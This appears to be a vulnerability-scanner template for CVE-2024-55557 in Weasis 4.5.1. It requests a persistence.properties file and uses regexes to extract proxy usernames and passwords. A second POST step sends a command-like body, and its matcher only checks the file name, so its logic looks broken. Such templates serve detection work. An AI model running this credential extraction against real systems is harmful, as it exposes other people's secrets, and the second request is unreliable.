id: CVE-2024-55557

info:
  name: Weasis 4.5.1 - Proxy Credentials Retrieval and Offline Decryption
  author: Riccardo Degli Esposti (partywave)
  severity: high
  description: |
    Weasis before and including version 4.5.1 is vulnerable to proxy credentials retrieval and offline decryption.
  reference:
    - https://weasis.org/en/
    - https://github.com/nroduit/Weasis
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-55557
  tags: cve,cve2024,weasis,proxy,credentials,decryption

requests:
  - method: GET
    path:
      - "{{BaseURL}}/weasis-core/persistence.properties"

    matchers:
      - type: word
        words:
          - "proxy.auth.user="
          - "proxy.auth.pwd="
        condition: and

    extractors:
      - type: regex
        regex:
          - "proxy.auth.user=(.*)"
          - "proxy.auth.pwd=(.*)"
        group: 1

  - method: POST
    path:
      - "{{BaseURL}}/weasis-core/persistence.properties"

    body: |
      weasis:info -a

    matchers:
      - type: word
        words:
          - "persistence.properties"
        condition: and

    extractors:
      - type: regex
        regex:
          - "persistence.properties"
        group: 1
